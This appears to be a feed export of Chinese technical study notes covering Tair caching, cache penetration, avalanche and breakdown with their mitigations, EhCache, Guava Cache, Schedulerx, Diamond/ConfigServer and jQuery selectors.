<h2 id="数据一致性" tabindex="-1"> 数据一致性</h2>
<p>Tair使用版本号version来保证数据一致性。在Tair的put接口中有version参数，如果不带version参数，则不考虑并发，直接强制更新。</p>
<ul>
<li>version：为解决并发更新同一个数据而设置。当version=0时，表示强制更新，当version非0时，判断客户端和服务端当version是否一致，不一致则返回ResultCode.VERERROR.</li>
<li>version的增加是服务器端的行为，tair并不支持多版本数据。另外，更新也是使用put接口。</li>
<li>version的值是由服务器端决定的，和client指定的version值无关。</li>
</ul>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-42-05.png" alt="" loading="lazy"></p>
<h2 id="负载均衡" tabindex="-1"> 负载均衡</h2>
<p>分布式负载均衡采用的是一致性哈希算法</p>
<ol>
<li>将机器根据hash函数映射到环上；</li>
<li>将数据桶根据hash函数映射到换上；</li>
<li>据数据映射到桶的位置顺时针找到第一台机器将该桶放到该机器上；</li>
<li>当某台机器坏掉时，类似(3)将存储在该机器上的数据顺时针找到下一台机器；</li>
<li>当增加机器时，将该机器与前一台机器(逆时针)之间的桶存储在新增机器上并从原来机器上移除。</li>
</ol>
<ul>
<li>优点：相比简单的对机器数取模算法，当节点变动的时候只有相对较少的key失效，实现也相对简单。不需要进行数据迁移，每个服务器是独立的。</li>
<li>缺点：还是会有部分的key失效，如果访问量非常大的时候，如果访问到失效的key的时候，就会直接访问到数据源上面去了，可能会导致数据源直接压挂。</li>
</ul>
<h2 id="多级缓存" tabindex="-1"> 多级缓存</h2>
<p>问题背景</p>
<p>Tair是一个高性能、分布式、可扩展、高可靠的NoSQL存储系统，在阿里巴巴集团内部有着大量的部署和使用。由于Tair的访问方式是客户端对请求的Key进行类一致性 Hash 计算后，再通过数据路由表查表定位到某台DataServer（数据节点服务器）进行读写的，所以对相同Key的读写请求必然固定映射到相同的DataServer上，如图
<img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-45-22.png" alt="" loading="lazy"></p>
<p>此时DataServer单节点的读写性能便成了单Key的读写性能瓶颈，且无法通过简单的水平扩展来解决。由于电商系的促销活动天然的存在热点数据，所以热点数据缓存的读写能力对整个缓存集群的稳定性和服务能力都起着至关重要的作用。</p>
<h3 id="热点读写" tabindex="-1"> 热点读写</h3>
<h4 id="热点识别" tabindex="-1"> 热点识别</h4>
<p>DataServer收到客户端的请求后，由每个具体处理请求的工作线程（Worker Thread）进行请求的统计。工作线程用来统计热点的数据结构均为ThreadLocal模式的数据结构，完全无锁化设计。热点识别算法使用精心设计的多级加权LRU链和HashMap组合的数据结构，在保证服务端请求处理效率的前提下进行请求的全统计，支持QPS热点和流量热点（即请求的QPS不大但是数据本身过大而造成的大流量所形成的热点）的精准识别。每个采样周期结束时，工作线程会将统计的数据结构转交到后台的统计线程池进行分析处理。统计工作异步在后台进行，不抢占正常的数据请求的处理资源。</p>
<h4 id="读热点" tabindex="-1"> 读热点</h4>
<ol>
<li>服务端设计</li>
</ol>
<p>相同Key的读写请求必然落在固定的DataServer上，且无法通过水平扩展DataServer数量来解决。</p>
<p>通过在DataServer上划分一块HotZone存储区域的方式来解决热点数据的访问。该区域存储当前产生的所有读热点的数据，由客户端配置的缓存访问逻辑来处理各级缓存的访问。多级缓存架构如下：</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-12-00-19.png" alt="" loading="lazy"></p>
<p>所有DataServer的HotZone存储区域之间没有权重关系，每个HotZone都存储相同的读热点数据。客户端对热点数据Key的请求会随机到任意一台DataServer的HotZone区域，这样单点的热点请求就被散列到多个节点乃至整个集群。</p>
<p>DataServer的HotZone使用独立的网络IO线程与工作线程，监听独立的热点数据读写端口，并初始化独立的LocalTair 模式的Mdb实例，进行热点数据的存储。使用独立的Mdb实例的原因是该逻辑要同时兼容Mdb和Ldb引擎，为了一套代码通用，所以从IO线程到Worker线程再到具体的处理线程都是独立的代码逻辑，并使用独立的Mdb实例进行存储。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-57-09.png" alt="" loading="lazy"></p>
<ol start="2">
<li>客户端设计</li>
</ol>
<p>当客户端在第一次请求前初始化时，会获取整个Tair集群的节点信息以及完整的数据路由表，同时也会获取配置的热点散列机器数（即客户端访问的HotZone的节点范围）。随后客户端随机选择一个HotZone区域作为自身固定的读写HotZone区域。在DataServer数量和散列机器数配置未发生变化的情况下，不会改变选择。即每个客户端只访问唯一的HotZone区域。</p>
<h4 id="写热点" tabindex="-1"> 写热点</h4>
<p>对于写热点，因为一致性的问题，难以使用多级缓存的方式来解决。</p>
<p>热点Key的写请求在IO线程被分发到专门的热点合并线程处理，该线程根据Key对写请求进行一定时间内的合并，随后由定时线程按照预设的合并周期将合并后的请求提交到引擎层。合并过程中请求结果暂时不返回给客户端，等请求合并写入引擎成功后统一返回。这样做不会有一致性的问题，不会出现写成功后却读到旧数据，也避免了LDB集群返回成功，数据并未落盘的情况（假写）。具体的合并周期在服务端可配置，并支持动态修改生效。</p>
<h1 id="分布式缓存面临的问题" tabindex="-1"> 分布式缓存面临的问题</h1>
<h2 id="缓存与数据库双写不一致" tabindex="-1"> 缓存与数据库双写不一致</h2>
<p>一般来说，如果允许缓存可以稍微的跟数据库偶尔有不一致的情况，也就是说如果你的系统不是严格要求 “缓存+数据库” 必须保持一致性的话，最好不要做这个方案，即：读请求和写请求串行化，串到一个内存队列里去。</p>
<p>串行化可以保证一定不会出现不一致的情况，但是它也会导致系统的吞吐量大幅度降低，用比正常情况下多几倍的机器去支撑线上的一个请求。</p>
<h2 id="缓存穿透" tabindex="-1"> 缓存穿透</h2>
<p>访问一个不存在的 key，缓存不起作用，请求会穿透到 DB，流量大时 DB 会挂掉。</p>
<p>举个栗子。系统A，每秒 5000 个请求，结果其中 4000 个请求是黑客发出的恶意攻击。数据库 id 是从 1 开始的，而黑客发过来的请求 id 全部都是负数。这样的话，缓存中不会有，请求每次都“视缓存于无物”，直接查询数据库。这种恶意攻击场景的缓存穿透就会直接把数据库给打死。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-16-48-39.png" alt="" loading="lazy"></p>
<p>解决方案：</p>
<ol>
<li>对查询结果为空的情况也进行缓存，缓存时间设置短一点，或者该 key 对应的数据 insert 之后再清理缓存。</li>
<li>对一定不存在的 key 进行过滤。可以把所有的可能存在的key放到一个大的Bitmap中，查询时通过该Bitmap过滤。</li>
</ol>
<h2 id="缓存雪崩" tabindex="-1"> 缓存雪崩</h2>
<p>对于系统 A，假设每天高峰期每秒 5000 个请求，本来缓存在高峰期可以扛住每秒 4000 个请求，但是缓存机器意外发生了全盘宕机。缓存挂了，此时 1 秒 5000 个请求全部落数据库，数据库必然扛不住，它会报一下警，然后就挂了。此时，如果没有采用什么特别的方案来处理这个故障，DBA 很着急，重启数据库，但是数据库立马又被新的流量给打死了。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-16-49-58.png" alt="" loading="lazy"></p>
<p>解决方案：</p>
<ol>
<li>在缓存失效后，通过加锁或者队列来控制读数据库写缓存的线程数量。比如对某个 key 只允许一个线程查询数据和写缓存，其他线程等待。</li>
<li>不同的 key，设置不同的过期时间，让缓存失效的时间点尽量均匀。</li>
<li>做二级缓存，A1 为原始缓存，A2为拷贝缓存，A1 失效时，可以访问 A2，A1 缓存失效时间设置为短期，A2 设置为长期（此点为补充）</li>
</ol>
<p>缓存雪崩的事前事中事后的解决方案如下：</p>
<p>事前：Redis 高可用，主从+哨兵，Redis cluster，避免全盘崩溃。
事中：本地 ehcache 缓存 + hystrix 限流&amp;降级，避免 MySQL 被打死。
事后：Redis 持久化，一旦重启，自动从磁盘上加载数据，快速恢复缓存数据。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-16-59-15.png" alt="" loading="lazy"></p>
<p>用户发送一个请求，系统 A 收到请求后，先查本地 ehcache 缓存，如果没查到再查 Redis。如果 ehcache 和 Redis 都没有，再查数据库，将数据库中的结果，写入 ehcache 和 Redis 中。</p>
<p>限流组件，可以设置每秒的请求，有多少能通过组件，剩余的未通过的请求，怎么办？走降级！可以返回一些默认的值，或者友情提示，或者空值。</p>
<p>好处：</p>
<ul>
<li>数据库绝对不会死，限流组件确保了每秒只有多少个请求能通过。</li>
<li>只要数据库不死，就是说，对用户来说，2/5 的请求都是可以被处理的。</li>
<li>只要有 2/5 的请求可以被处理，就意味着你的系统没死，对用户来说，可能就是点击几次刷不出来页面，但是多点几次，就可以刷出来了</li>
</ul>
<h2 id="缓存击穿" tabindex="-1"> 缓存击穿</h2>
<p>某个 key 非常热点，访问非常频繁，处于集中式高并发访问的情况，当这个 key 在失效的瞬间，大量的请求就击穿了缓存，直接请求数据库，就像是在一道屏障上凿开了一个洞。</p>
<p>解决方案：</p>
<ol>
<li>使用互斥锁 (mutex key)：感知到缓存失效，去查询 DB 时，使用分布式锁，使得只有一个线程去数据库加载数据，加锁失败的线程，等待即可。</li>
<li>手动过期：redis 上从不设置过期时间，功能上将过期时间存在 key 对应的 value 里，如果发现要过期，通过一个后台的异步线程进行缓存的构建，也就是“手动”过期。</li>
</ol>
<p>不同场景下的解决方式可如下：</p>
<ul>
<li>若缓存的数据是基本不会发生更新的，则可尝试将该热点数据设置为永不过期。</li>
<li>若缓存的数据更新不频繁，且缓存刷新的整个流程耗时较少的情况下，则可以采用基于 Redis、zookeeper 等分布式中间件的分布式互斥锁，或者本地互斥锁以保证仅少量的请求能请求数据库并重新构建缓存，其余线程则在锁释放后能访问到新缓存。</li>
<li>若缓存的数据更新频繁或者在缓存刷新的流程耗时较长的情况下，可以利用定时线程在缓存过期前主动地重新构建缓存或者延后缓存的过期时间，以保证所有的请求能一直访问到对应的缓存。</li>
</ul>
<h2 id="缓存并发竞争" tabindex="-1"> 缓存并发竞争</h2>
<p>某个时刻，多个系统实例都去更新某个 key。可以基于 zookeeper 实现分布式锁。每个系统通过 zookeeper 获取分布式锁，确保同一时间，只能有一个系统实例在操作某个 key，别人都不允许读和写。</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-17-11-50.png" alt="" loading="lazy"></p>
<p>要写入缓存的数据都是从 mysql 里查出来的，都得写入 mysql 中，写入 mysql 中的时候必须保存一个时间戳，从 mysql 查出来的时候，时间戳也要查出来。</p>
<p>每次要写之前，先判断一下当前这个 value 的时间戳是否比缓存里的 value 的时间戳要新。如果是的话，那么可以写，否则，就不能用旧的数据覆盖新的数据。</p>
<h1 id="常见缓存框架" tabindex="-1"> 常见缓存框架</h1>
<h2 id="ehcache" tabindex="-1"> EhCache</h2>
<p>EhCache 是一个纯Java的进程内缓存框架，具有快速、精干等特点，是Hibernate中默认CacheProvider</p>
<h3 id="特性" tabindex="-1"> 特性</h3>
<ul>
<li>快速、简单</li>
<li>多种缓存策略</li>
<li>缓存数据有两级：内存和磁盘</li>
<li>缓存数据会在虚拟机重启的过程中写入磁盘</li>
<li>可以通过RMI、可插入API等方式进行分布式缓存</li>
<li>具有缓存和缓存管理器的侦听接口</li>
<li>支持多缓存管理器实例，以及一个实例的多个缓存区域</li>
<li>内存统计</li>
</ul>
<h3 id="瓶颈" tabindex="-1"> 瓶颈</h3>
<ul>
<li>
<p>缓存漂移（Cache Drift）
每个应用节点只管理自己的缓存，在更新某个节点的时候，不会影响到其他的节点，这样数据之间可能就不同步了。</p>
</li>
<li>
<p>数据库瓶颈（Database Bottlenecks ）
对于单实例的应用来说，缓存可以保护数据库的读风暴；但是，在集群的环境下，每一个应用节点都要定期保持数据最新，节点越多，要维持这样的情况对数据库的开销也越大。</p>
</li>
</ul>
<h2 id="guava-cache" tabindex="-1"> Guava Cache</h2>
<p>Guava Cache是Google开源的Java重用工具集库Guava里的一款缓存工具，它的设计灵感来源于ConcurrentHashMap，使用多个segments方式的细粒度锁，在保证线程安全的同时，支持高并发场景需求，同时支持多种类型的缓存清理策略，包括基于容量的清理、基于时间的清理、基于引用的清理等。
Guava cache是google开发的，目前被常用在单机上，如果是分布式，它就无能为力了</p>
<h3 id="特性-1" tabindex="-1"> 特性</h3>
<p>guava cache类似concurrentMap使用分段锁提高并发写的效率</p>
<ul>
<li>支持缓存三种缓存淘汰策略</li>
<li>支持缓存移除监听(移除、过期、gc回收)</li>
<li>支持key/value的软引用、弱引用缓存</li>
<li>命中率统计</li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">分布式计算</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E8%AE%A1%E7%AE%97.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E8%AE%A1%E7%AE%97.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[

<h1 id="分布式计算" tabindex="-1"> 分布式计算</h1>
<p>分布式计算系统构建在分布式存储的基础上，充分发挥分布式系统的数据冗余灾备，多副本高效获取数据的特性，进而并行计算，把原本需要长时间计算的任务拆分成多个任务并行处理，从而提高了计算效率。分布式计算系统在场景上分为离线计算，实时计算和流式计算。</p>
<ul>
<li>离线：Hadoop</li>
<li>实时：Spark</li>
<li>流式：Storm，Flink/Blink</li>
</ul>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-15-18-36.png" alt="" loading="lazy"></p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-15-18-43.png" alt="" loading="lazy"></p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">Schedulerx</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E8%B0%83%E5%BA%A6.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E8%B0%83%E5%BA%A6.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>

<h1 id="schedulerx" tabindex="-1"> Schedulerx</h1>
<p>Schedulerx是阿里中间件自研的基于Akka架构（Akka in Schedulerx2.0）的新一代分布式任务调度平台，提供定时、任务编排、分布式跑批等功能，具有高可靠、海量任务、秒级调度、可运维等能力。</p>
<p>Schedulerx2.0开始于2018-01-22，没有参考DTS和Schedulerx，是全新自研的下一代任务调度平台，不但兼容老版本编程模型，还提供更多更快更强的能力。</p>
<ul>
<li>更多：支持多种时间表达式，任务编排，支持更多的业务场景。单机群支持上千万任务，一天上十亿次调度，支持更多的任务数。</li>
<li>更快：支持秒级别调度，处理准实时业务。</li>
<li>更强：支持日志查询、原地重跑、重刷数据等多种操作，提供更强的运维能力和排错手段。</li>
</ul>
<h2 id="主要功能" tabindex="-1"> 主要功能</h2>
<ul>
<li>强大的定时调度器：Crontab，当然，必须支持crontab表达式</li>
<li>Fixed rate：众所周知，crontab必须被60整除，比如想每隔40分钟跑一次，cron不支持。Fixed rate专门用来做定期轮询，表达式简单。</li>
<li>Fixed delay：适合做轮询的业务，比如每次执行完成隔10秒再跑，那么fixed delay非常适合你。</li>
<li>日历：支持多种日历，还可以自定义导入日历。比如金融业务需要在每个交易日执行。</li>
<li>时区：跨国的业务，需要在每个国家的时区定时执行某个任务。</li>
<li>任务编排：schedulerx2.0支持工作流（DAG）进行任务编排，操作简单，前端直接单手操作拖拖拽拽即可。详细的任务状态图能一目了然看到下游任务为什么没跑，如下图：
<img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-46-11.png" alt="" loading="lazy"></li>
<li>任务类型：支持多种任务类型，可以无限扩展！
<ul>
<li>java：可以跑在用户进程中，也可以上传jar包动态加载。</li>
<li>shell：前端直接写shell脚本。</li>
<li>python：前端直接写python脚本，需要机器有python环境。</li>
<li>go：前端直接写go脚本，需要机器有go环境。</li>
<li>自定义：用户甚至可以自定义任务类型，然后实现一个plugin就行</li>
</ul>
</li>
<li>执行方式&amp;分布式编程模型
<ul>
<li>单机：随机挑选一台机器执行</li>
<li>广播：所有机器同时执行且等待全部结束</li>
<li>并行计算：map/mapreduce模型，1~300个子任务，有子任务列表。</li>
<li>内存网格：map/mapreduce模型，10W以下子任务，无子任务列表，基于内存计算，比网格计算快。</li>
<li>网格计算：map/mapreduce模型，100W以下子任务，无子任务列表，基于文件H2计算。</li>
</ul>
</li>
</ul>
<h2 id="系统架构" tabindex="-1"> 系统架构</h2>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-52-26.png" alt="" loading="lazy"></p>
<p>可扩展的执行引擎</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-52-55.png" alt="" loading="lazy"></p>
<ul>
<li>TaskMaster：类似于yarn的AppMaster，支持可扩展的分布式执行框架，进行整个jobInstance的生命周期管理、container的资源管理，同时还有failover等能力。默认实现StandaloneTaskMaster（单机执行），BroadcastTaskMaster（广播执行），MapTaskMaster（并行计算、内存网格、网格计算），MapReduceTaskMaster（并行计算、内存网格、网格计算）。</li>
<li>Container：执行业务逻辑的容器框架，支持线程/进程/docker/actor等。</li>
<li>Processor：业务逻辑框架，不同的processor表示不同的任务类型。</li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">Diamond</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[<h1 id="diamond" tabindex="-1"> Diamond</h1>
<p>Diamond是淘宝内部广泛使用的配置中心，提供持久化管理和动态配置推送服务。 配置的持久化管理，是Diamond与淘宝内部另外一个软负载配置产品ConfigServer的主要区别。应用方发布的配置会通过持久化存储保存，与发布者的生命周期无关。 动态配置推送，则是Diamond的核心功能，在淘宝内部有很多应用场景，如数据库动态切换和扩容，业务系统开关配置运行时变更等。</p>
<p>实时的动态配置推送，本质上是如何把服务端的更新状态，实时发送给客户端的问题。 TCP长连接是最自然的一种解决方案，但是由于设计上，Diamond选择了Http协议提供服务。 如何在Http协议的Request-Response通信模型下解决这个问题，是Diamond面临的难题。淘宝生产环境中的Diamond服务，采用了基于推模型的客户端长轮询的方案来实现动态配置实时推送。 基于Http长轮询模型，实现了让客户端在没有发生动态配置变更的时候减少轮询。这样减少了无意义的轮询请求量，提高了轮询的效率；也降低了系统负载，提升了整个系统的资源利用率。 另外，这种推拉结合的策略，做到了在长连接和短连接之间的平衡，实现上让服务端不用太关注连接的管理，效果上又获得了类似TCP长连接的信息推送的实时性。</p>
<p>Diamond的比较适合低频变更的动态配置管理，对于配置的变更只保证最终一致性，不保证过程一致性；要求接入的业务满足幂等性，有部分用户拿Diamond做事件通知，可能会导致事件丢失。</p>
<h1 id="configserver" tabindex="-1"> ConfigServer</h1>
<p>ConfigServer中文名为非持久配置中心，主要用于非持久数据的发布和订阅，数据的生命周期和TCP连接生命周期绑定，产品架构基于发布订阅模型，去中心无master设计，保证了系统的可扩展性、高可用。在集团内部主要场景为分布式消息系统Notify、分布式RPC框架HSF提供地址发现服务。</p>
<h2 id="特性" tabindex="-1"> 特性</h2>
<ol>
<li>无Master架构：ConfigServer基于无Master架构ConfigServer是无中心化的架构，不存在单点问题，通过特定的算法进行数据增量同步。</li>
<li>自动聚合：ConfigServer支持数据的自动聚合配置数据的聚合功能。每台机器向ConfigServer注册自己的服务元信息，ConfigServer会根据服务名和分组自动聚合所有元数据，提供给服务订阅方使用。</li>
<li>实时：ConfigServer是推数据的模型ConfigServer的服务端与客户端是基于长连接的方式进行通信，在客户端订阅关系确定后，配置信息一旦发生变化，会主动推送配置数据到客户端，并回调客户端的业务监听器</li>
</ol>
<h2 id="应用场景" tabindex="-1"> 应用场景</h2>
<ol>
<li>服务发现：HSF，Notify</li>
<li>非持久配置的发布、订阅：Mtop</li>
<li>集群管理：天猫监控，TDD</li>
</ol>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">JQuery 介绍</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%89%8D%E7%AB%AF/JS-%E8%BF%9B%E9%98%B6.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%89%8D%E7%AB%AF/JS-%E8%BF%9B%E9%98%B6.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>

<h1 id="jquery-介绍" tabindex="-1"> JQuery 介绍</h1>
<h2 id="jquery-简介" tabindex="-1"> JQuery 简介</h2>
<p>jQuery 全称 javaScript Query 是js的一个框架。</p>
<ol>
<li>jquery是由美国人John Resig创建，至今已吸引了来自世界各地的众多 javascript高手加入其team。</li>
<li>jQuery是继prototype之后又一个优秀的Javascript框架。其宗旨是——WRITE LESS,DO MORE!</li>
<li>它是轻量级的js库(压缩后只有21k) ，这是其它的js库所不及的，它兼容CSS3，还兼容各种浏览器</li>
<li>jQuery是一个快速的，简洁的javaScript库，使用户能更方便地处理HTMLdocuments、events、实现动画效果，并且方便地为网站提供AJAX交互。</li>
<li>jQuery还有一个比较大的优势是，它的文档说明很全，而且各种应用也说得很详细，同时还有许多成熟的插件可供选择</li>
</ol>
<p>JQuery的特点</p>
<ul>
<li>支持各种主流的浏览器。</li>
<li>使用特别简单</li>
<li>拥有便捷的插件扩展机制和丰富的插件</li>
</ul>
<p><strong>封装原理</strong></p>
<ul>
<li>js的全局代码区只有一个，这样就会造成同名变量的值会被覆盖。</li>
<li>使用对象封装，将代码封装到对象中.但是对象如果被覆盖，则全部失效，风险极高。</li>
<li>使用工厂模式,将代码进行封装，但是并没有解决问题</li>
<li>将封装的函数名字去除，避免覆盖。但是函数没有办法调用了。</li>
<li>匿名自调用，可以在页面加载的时候调用一次。但是不能重复调用，并且数据没有办法获取</li>
<li>使用闭包,将数据一次性挂载到window对象下</li>
<li>闭包原理:在全局区中不能够获取函数体内的数据。使用更大作用域的变量来记录小作用域变量的值。</li>
</ul>
<h2 id="jquery-核心" tabindex="-1"> JQuery 核心</h2>
<h3 id="jquery-核心对象" tabindex="-1"> JQuery 核心对象</h3>
<p><code>window.jQuery = window.$ = jQuery;</code></p>
<ul>
<li>在window对象中，多了两个属性，叫做jQuery 和 $</li>
<li>jQuery属性 和 $可以相互替代</li>
</ul>
<h3 id="jquery-对象" tabindex="-1"> JQuery 对象</h3>
<p>jQuery 对象就是通过jQuery包装DOM对象后产生的对象。jQuery 对象是 jQuery 独有的。</p>
<p>虽然jQuery对象是包装DOM对象后产生的，但是jQuery无法使用DOM对象的任何方法，同理DOM对象也不能使用jQuery里的方法</p>
<p>jQuery的基础语法：$(selector).action()</p>
<p><strong>JQuery对象和DOM对象互相转换</strong></p>
<div><pre><code><span>//DOM --> jquery</span>
<span>let</span> $div<span>=</span> <span>$</span><span>(</span>dom对象<span>)</span><span>;</span>
<span>//jquery ---> DOM</span>
<span>let</span> div <span>=</span> $div<span>[</span><span>0</span><span>]</span>
</code></pre></div><h3 id="注意点" tabindex="-1"> 注意点</h3>
<p>任何jQuery 元素对象的赋值操作，基本上都是通过方法的第二个参数赋值，不会出现 =</p>
<h1 id="jquery-使用" tabindex="-1"> JQuery 使用</h1>
<h2 id="选择器" tabindex="-1"> 选择器</h2>
<p>jQuery中选择器获取的是存储了HTML元素对象的数组。</p>
<p>jQuery获取的元素对象不能够直接使用js的内容，按照数组的取出方式将对象取出后可以使用js的内容。</p>
<h3 id="基本选择器" tabindex="-1"> 基本选择器</h3>
<table>
<thead>
<tr>
<th>名称</th>
<th>选择器</th>
<th>实例</th>
<th>选取说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>全部选择器</td>
<td>*</td>
<td>$(&quot;*&quot;)</td>
<td>所有元素</td>
</tr>
<tr>
<td>id选择器</td>
<td>#id</td>
<td>$(&quot;#id&quot;)</td>
<td>id=&quot;id&quot; 的元素</td>
</tr>
<tr>
<td>类选择器</td>
<td>.class</td>
<td>$(&quot;.classname&quot;)</td>
<td>所有 class=&quot;classname&quot; 的元素</td>
</tr>
<tr>
<td>标签选择器</td>
<td>element</td>
<td>$(&quot;p&quot;)</td>
<td>所有 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td>组合选择器</td>
<td>s1,s2,s3</td>
<td>$(&quot;th,td,.intro&quot;)</td>
<td>所有带有匹配选择的元素</td>
</tr>
</tbody>
</table>
<h3 id="层叠选择器" tabindex="-1"> 层叠选择器</h3>
<table>
<thead>
<tr>
<th>名称</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>后代选择器</td>
<td>$(div span)</td>
<td>选取某元素的后代元素</td>
</tr>
<tr>
<td>子元素选择器</td>
<td>$(div &gt; span)</td>
<td>选择作为某元素子元素的元素</td>
</tr>
<tr>
<td>相邻兄弟选择器</td>
<td>$(div + div )</td>
<td>选择紧接在另一元素后的元素，且二者有相同父元素  -----相同写法  $(div).next(&quot;div&quot;);</td>
</tr>
<tr>
<td>普通兄弟选择器</td>
<td>$(div ~ div)</td>
<td>选取所有指定元素之后的相邻兄弟元素       -----相同写法  $(div).nextAll(&quot;div&quot;);</td>
</tr>
</tbody>
</table>
<h3 id="基本过滤选择器" tabindex="-1"> 基本过滤选择器</h3>
<table>
<thead>
<tr>
<th>选择器</th>
<th>实例</th>
<th>选取说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>:first</td>
<td>$(&quot;p:first&quot;)</td>
<td>第一个 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td>:last</td>
<td>$(&quot;p:last&quot;)</td>
<td>最后一个 <code>&lt;p&gt;</code> 元素</td>
</tr>
<tr>
<td>:even</td>
<td>$(&quot;tr:even&quot;)</td>
<td>所有偶数 <code>&lt;tr&gt;</code> 元素</td>
</tr>
<tr>
<td>:odd</td>
<td>$(&quot;tr:odd&quot;)</td>
<td>所有奇数 <code>&lt;tr&gt;</code> 元素</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>:eq(index)</td>
<td>$(&quot;ul li:eq(3)&quot;)</td>
<td>列表中的第四个元素（index 从 0 开始）</td>
</tr>
<tr>
<td>:gt(no)</td>
<td>$(&quot;ul li:gt(3)&quot;)</td>
<td>列出 index 大于 3 的元素</td>
</tr>
<tr>
<td>:lt(no)</td>
<td>$(&quot;ul li:lt(3)&quot;)</td>
<td>列出 index 小于 3 的元素</td>
</tr>
<tr>
<td>:not(selector)</td>
<td>$(&quot;input:not(:empty)&quot;)</td>
<td>所有不为空的 input 元素</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>:header</td>
<td>$(&quot;:header&quot;)</td>
<td>所有标题元素 <code>&lt;h1&gt; - &lt;h6&gt;</code></td>
</tr>
<tr>
<td>:animated</td>
<td></td>
<td>所有动画元素</td>
</tr>
</tbody>
</table>
<h3 id="属性选择器" tabindex="-1"> 属性选择器</h3>
<table>
<thead>
<tr>
<th>选择器</th>
<th>实例</th>
<th>选取说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>[attribute]</td>
<td>$(&quot;[href]&quot;)</td>
<td>所有带有 href 属性的元素</td>
</tr>
<tr>
<td>[attribute=value]</td>
<td>$(&quot;[href='#']&quot;)</td>
<td>所有 href 属性的值等于 &quot;#&quot; 的元素</td>
</tr>
<tr>
<td>[attribute!=value]</td>
<td>$(&quot;[href!='#']&quot;)</td>
<td>所有 href 属性的值不等于 &quot;#&quot; 的元素</td>
</tr>
<tr>
<td>[attribute$=value]</td>
<td><span><span><i>Content not supported</i></span><span aria-hidden="true"><span><span style="height:1em;vertical-align:-0.25em;"></span><span>(</span><span>&quot;</span><span>[</span><span>h</span><span>re</span><span style="margin-right:0.10764em;">f</span></span></span></span>='.jpg']&quot;)</td>
<td>所有 href 属性的值包含以 &quot;.jpg&quot; 结尾的元素</td>
</tr>
</tbody>
</table>
